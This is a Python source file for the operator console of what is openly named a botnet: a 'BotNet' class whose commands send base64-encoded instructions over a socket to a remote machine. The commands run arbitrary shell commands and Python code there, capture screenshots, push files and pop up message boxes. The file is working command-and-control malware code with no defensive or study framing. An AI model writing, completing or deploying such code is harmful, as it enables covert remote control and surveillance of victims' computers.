
import os
import base64
import random
import time
import core.utils
from core.colors import *

class BotNet:
    
  CONNECTIONS = []

  def cmd_help(cls, args):
    help_message=""
    print(help_message)

  def cmd_shutdown(cls, args):
    if core.utils.question_yn('You really need to shutdown server?'):
      cls.conn.send(random.choice([b'sd0f',b'lg9',b'lSm2a',b'pLf1',b'lmSD3',b'qD',b'pWc2']))
      time.sleep(2)
      cls.conn.close()
      cls.stopped = True
      try:cls.connalivethread_.join()
      except:os._exit(0)
    else:
      print(f'[{G}+{N}] Shutdown canceled.')

  def cmd_msgbox(cls, args):
    if len(args) < 3:
      print(f'[{R}-{N}] Usage: {Y}msgbox [title] [message] [icon]{N} (type "help")')
    else:
      title, message, icon = args[0], args[1], args[2]
      cls.conn.send(base64.b64encode(f'msgbox;{title};{message};{icon}'.encode()))

  def cmd_screenshot(cls, args):
    cls.conn.send(base64.b64encode('screenshot;'.encode()))

    try: os.remove('screenshot.png')
    except: pass

    while True:
      data = cls.conn.recv(4096)
      if data != base64.b64encode('screenshot_ended!'.encode()):
        with open('screenshot.png','ab+') as f:
          f.write(data)
      else: break
    print(f'[{G}+{N}] Screenshot saved as "screenshot.png"')

  def cmd_sendfile(cls, args):
    if len(args) < 1:
      print(f'[{R}-{N}] Usage: {Y}sendfile [path to file]{N} (type "help")')
    else:
      if os.path.exists(args[0]) and os.path.isfile(args[0]):
        with open(args[0],'rb') as f:
          cnt = f.read()
        fn = os.path.split(args[0])[1]
        cls.conn.send(base64.b64encode(f'sendfile;{fn}'.encode()))
        with open(args[0],'rb') as f:
          while True:
            bytes_read = f.read(4096)
            if not bytes_read:
              cls.conn.send(base64.b64encode('file_ended!'.encode()))
              break
            cls.conn.send(bytes_read)
      else:
        print(f'[{R}-{N}] File not exists or is directory!')
      print(f'[{G}+{N}] Done!')

  def cmd_runcmd(cls, args):
    if len(args) < 1:
      print(f'[{R}-{N}] Usage: {Y}runcmd [command]{N} (type "help")')
    else:
      command = args[0]
      cls.conn.send(base64.b64encode(f'runcmd;{command}'.encode()))

  def cmd_runcode_nocallback(cls, args):
    if len(args) < 1:
      print(f'[{R}-{N}] Usage: {Y}runcode_nocallback{N} [python code] (type "help")')
    else:
      code = args[0]
      cls.conn.send(base64.b64encode(f'runcode_nocallback;{code}'.encode()))

  def cmd_runcode_callback(cls, args):
    if len(args) < 1:
      print(f'[{R}-{N}] Usage: {Y}runcode_callback{N} [python code] (type "help")')
    else:
      code = args[0]
      cls.conn.send(base64.b64encode(f'runcode_callback;{code}'.encode()))
      callback = cls.conn.recv(1024)
      print(callback.decode())

BotNet.commands = {
  'help': BotNet.cmd_help,
  'shutdown': BotNet.cmd_shutdown,
  'msgbox': BotNet.cmd_msgbox,
  'screenshot': BotNet.cmd_screenshot,
  'runcmd': BotNet.cmd_runcmd,
  'runcode_callback': BotNet.cmd_runcode_callback,
  'runcode_nocallback': BotNet.cmd_runcode_nocallback,
  'sendfile': BotNet.cmd_sendfile
}